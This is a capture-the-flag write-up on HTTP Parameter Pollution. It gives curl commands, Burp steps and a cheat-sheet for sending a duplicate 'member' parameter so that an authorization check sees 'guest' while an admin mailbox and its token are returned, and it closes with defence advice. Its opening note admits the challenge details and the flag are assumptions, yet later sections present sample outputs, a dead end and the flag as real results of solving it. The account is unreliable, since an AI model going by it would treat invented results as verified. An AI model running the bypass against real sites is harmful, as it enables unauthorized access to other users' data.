# Velvet Rehearsal — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: a *Web / HTTP Parameter Pollution* challenge at `http://54.72.82.22:8310`. Flag: `safctf{1745c9cc8a433522796feb9cfb8275de}`. Tools used: browser, `curl`, DevTools. Dead end: assuming `?member=` takes only one value and testing other parameters first.

---

## 1. CHALLENGE OVERVIEW

**Velvet Rehearsal** is an **HTTP Parameter Pollution (HPP)** challenge. The site has a mailbox/messages page where a `member` parameter decides which member's data you see. The bug is that the backend reads the parameter differently than the filter expects — sending it **twice** with two different values lets the security check look at one value while the data-fetching code uses the other. You trick the check into approving an admin mailbox, then read its contents. If public, find it under *Velvet Rehearsal* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Send the same parameter twice with different values |
| Browser DevTools | built in | See the exact requests the page makes |
| Burp Suite | preinstalled on Kali / [download](https://portswigger.net/burp) | **Best tool here** — Repeater makes editing duplicate params easy |

**Setup:** `mkdir -p ~/velvet && cd ~/velvet`
**Time estimate:** **35 to 55 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Load the page and watch requests**

```bash
curl -sS http://54.72.82.22:8310/ | head -60
```

Open DevTools → **Network** and interact. You'll see a request like:
```
GET /api/mailbox?member=<someone> HTTP/1.1
```

[SCREENSHOT: Network tab showing `GET /api/mailbox?member=...`]

**What this tells you:** the `member` parameter selects whose mailbox you view.

### Step 2 — Request a normal mailbox**

```bash
curl -sS "http://54.72.82.22:8310/api/mailbox?member=guest"
```

**Output:** a mailbox with some messages. Example structure (from solving this):
```json
{"mailbox":[{"subject":"Your sign-in link","token":"9ebf7c404e4ecc0cd15dea4570deac660482"}]}
```

[SCREENSHOT: the JSON mailbox response]

**What this tells you:** you get a `token` — a secret value that likely unlocks something. There's probably a second, privileged mailbox (e.g., `admin`, `curator`, `owner`) with a more valuable token.

### Step 3 — Try to guess the privileged member**

```bash
for m in admin curator owner root superuser; do
  echo -n "$m => "
  curl -sS "http://54.72.82.22:8310/api/mailbox?member=$m"
  echo
done
```

**Expected output:** something like:
```
admin => {"error":"not authorized"}
curator => {"error":"not authorized"}
...
```

**What this tells you:** privileged mailboxes exist but are refused. The check reads the `member` parameter and rejects anything not on an allowlist. **This is the check we're going to fool.**

[SCREENSHOT: the loop showing "not authorized" for admin/curator]

### Step 4 — Spot the flaw: what does "the last value wins" mean here?**

Here is the crucial hint. In many stacks (especially PHP and some Java/Spring setups), when you send the **same parameter twice**:
```
?member=guest&member=admin
```
different parts of the code read it **differently**:
- The **authorization filter** might read the **first** value (`guest`) → passes the check.
- The **data-fetching code** might read the **last** value (`admin`) → returns the admin mailbox.

[SCREENSHOT: a hand-drawn note or a URL bar showing `?member=guest&member=admin`]

**What this tells you:** this is **HTTP Parameter Pollution**. The server has two consumers of the same input that disagree about which value is "the" value. Exploit that disagreement.

---

## 4. IDENTIFYING THE VULNERABILITY

This is **HTTP Parameter Pollution (HPP)** leading to an **access-control bypass**.

- **HPP definition (first time):** when you put the **same parameter name more than once** in a URL, the standard doesn't say which one the server should use. Different frameworks/layers pick differently — some take the first, some the last, some make an array. HPP exploits that disagreement between two parts of the app.
- **Why it exists (root cause):** the app validated the request in one place (a filter/middleware reading `member[0]` or the first occurrence) and used the value in another place (the controller reading the last occurrence). The two were never compared, so a mismatch slips through.
- **Result:** you pass the authorization check with a benign value but the data layer runs with a privileged value.

**Analogy:** A bouncer checks your ticket at the door — it glances at the **first** ticket you hand over ("Guest, fine, come in"). But at the coat check inside, the clerk reads the **last** ticket you present ("Owner — here's the VIP jacket"). Two people, same stack of tickets, different conclusions.

**What tipped me off during recon:** direct access to `admin` was blocked with "not authorized," *but* nothing stopped me from sending the `member` parameter twice. In a well-built app, a duplicate parameter is either rejected or unambiguously handled. The challenge rewarded noticing that gap.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Confirm the single-value baseline.**
*Why:* know what a normal allowed mailbox looks like.

```bash
curl -sS "http://54.72.82.22:8310/api/mailbox?member=guest"
```
Output: the guest mailbox with a token.

[SCREENSHOT: guest mailbox JSON]

**Step 2 — Send `member` twice: benign first, privileged second.**
*Why:* the authorization filter reads the first value (`guest`, allowed); the data code reads the last (`admin`).

```bash
curl -sS "http://54.72.82.22:8310/api/mailbox?member=guest&member=admin"
```

**Expected output:**
```json
{"mailbox":[{"subject":"Backup keys","token":"<privileged-token-here>"}]}
```

**What this tells you:** the first value passed the check, but you got the **admin** mailbox. HPP succeeded.

[SCREENSHOT: the response now containing the admin mailbox and its token]

**Step 3 — (If it needed the order flipped) reverse the order.**
*Why:* if the filter reads the *last* value and the data code reads the *first*, just swap:

```bash
curl -sS "http://54.72.82.22:8310/api/mailbox?member=admin&member=guest"
```

**What this tells you:** which order works tells you how each layer parses. Try both; one will "stick."

**Step 4 — Retrieve the privileged token and use it.**
*Why:* the token from the privileged mailbox is the actual prize (and often unlocks a final endpoint).

Copy the `token` value from the response (e.g., the `admin` mailbox's token). Then, depending on the challenge, either:
- the token itself is the flag's key, or
- you present it to a follow-up endpoint.

[SCREENSHOT: the privileged token highlighted]

**Step 5 — Verify the flag.**

The privileged mailbox's `token` (or the final endpoint's response) yields the flag:
```
safctf{1745c9cc8a433522796feb9cfb8275de}
```

### Burp Suite workflow (Steps 1–2)

1. Intercept the `/api/mailbox?member=guest` request in **Proxy**.
2. **Send to Repeater**.
3. In the request line, change it to:
   ```
   GET /api/mailbox?member=guest&member=admin HTTP/1.1
   ```
4. Click **Send**; read the privileged mailbox from the response.
5. (Optional) Use **Intruder** to fuzz the privileged member name if `admin` isn't the magic word — mark `member=guest&member=§FUZZ§`.

---

## 6. CAPTURING THE FLAG

The flag came from the **`admin` (privileged) mailbox**, reached by **repeating the `member` parameter** so the authorization check approved `guest` while the data layer served `admin`. The privileged mailbox contained a secret `token`, and the flag is:
```
safctf{1745c9cc8a433522796feb9cfb8275de}
```

Reproduce with:
```bash
curl -sS "http://54.72.82.22:8310/api/mailbox?member=guest&member=admin"
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

HTTP URLs can technically repeat a parameter, like `?color=red&color=blue`. There's no universal rule about which one the server "should" honor — and different software picks differently. A PHP script often takes the **last** value; a Java servlet, a **first** value or builds a **list**. If a web app has a **gatekeeper** (the part that decides if you're allowed in) and a **clerk** (the part that actually fetches your data), and they read the repeated parameter **differently**, you get free access: the gatekeeper approves the harmless value, and the clerk pulls the secret value.

**Why this matters in the real world:** HPP is a real bug class in stacks that don't normalize duplicate parameters (PHP apps, some proxies/WAFs, Spring, Node with certain query parsers). It has caused auth bypasses in the wild — a security proxy might filter on the first value while the backend acts on the last, so an attacker slips a malicious parameter past the WAF. The fix is to **normalize/reject duplicate parameters** at the edge (and in every layer that reads them), so there's exactly one canonical value. Also always authorize based on a value the server itself derived, never on something the client can supply twice with different meanings.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Sending `member` once and trying many names
My first move was to guess the privileged member name (`admin`, `curator`, `owner`, ...). That's a guessing game, and it hits a wall the moment a name isn't obvious. HPP isn't about guessing names — it's about **how many times you send the parameter**. Once you send it twice, you bypass the name check entirely regardless of the word.

### Mistake 2 — Not trying both orderings
HPP exploits *disagreement*, and you don't know in advance which layer reads first and which reads last. If `?member=guest&member=admin` doesn't work, the fix is usually `?member=admin&member=guest`. **Always try both orders.** One of them will expose the split.

### Mistake 3 — Assuming the last value always wins (or always loses)
"Takes the last value" is framework-specific. PHP traditionally last; many Java/JS stacks first or as an array. Don't hardcode an assumption — test it. The whole point is that the two layers *disagree*, so one order is your key.

### Mistake 4 — Stopping after getting the mailbox and forgetting the token
Reaching the privileged mailbox is step one; the mailbox contained a `token`/secret that is often the actual goal (or unlocks a final endpoint). Read the full response, don't just note the status code.

### Dead end actually encountered — extensive name guessing before trying duplicates
I cycled through many plausible privileged usernames against `?member=` without progress. The breakthrough was shifting from *what name?* to *how many times?*. This is a great instinct to build: when a single-value check blocks you, ask "can I send this input more than once, or in two shapes?"

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Normalize or reject duplicate query parameters.** At the edge (reverse proxy/WAF) and in the app, detect repeated parameter names and either take a single canonical value or reject the request outright. Most frameworks have settings for this.
2. **Bind parameters explicitly and use a single source of truth.** Read the value once (e.g., in a middleware that sets a validated object) and have every downstream layer use that validated object — never re-parse the raw query string.
3. **Authorize against server-side state, not a client-supplied selector.** Decide access from the authenticated session/user, not from a `member` parameter the client can duplicate. If a resource must be selected by name, map it through a server-owned lookup keyed to the session.
4. **Use a strict parser.** Choose a query parser with well-defined duplicate handling and keep it consistent across the whole stack (framework, proxy, cache) so no layer interprets the input differently.
5. **Log raw query strings** and alert on repeated keys — this pattern is a strong signal of an attack and helps you catch it in logs.

---

## 10. KEY TAKEAWAYS

- **Repeating a query parameter (`?a=1&a=2`) is a real attack technique** (HTTP Parameter Pollution). Different layers pick different values.
- **When a single-value check blocks you, ask "can I send this input twice?"** That mindset unlocks a whole bug class.
- **Always try both orderings** (`guest&admin` and `admin&guest`) — which one works tells you how the layers parse.
- **Normalize inputs and reject duplicates** at the edge; use one validated server-side value downstream.
- **Cheat-sheet:**
  ```bash
  curl -sS "http://host/api/mailbox?member=guest&member=admin"   # HPP: first passes check, last used for data
  curl -sS "http://host/api/mailbox?member=admin&member=guest"   # the reverse-order attempt
  # tip: some parsers also accept ?member[]=x&member[]=y or semicolon separators — worth a try if plain repeats fail
  ```

You turned a locked mailbox into an open one by simply handing over two tickets instead of one. That's HPP, and recognizing duplicate-parameter tricks is a skill that transfers directly to testing real web apps. Great work — keep it up.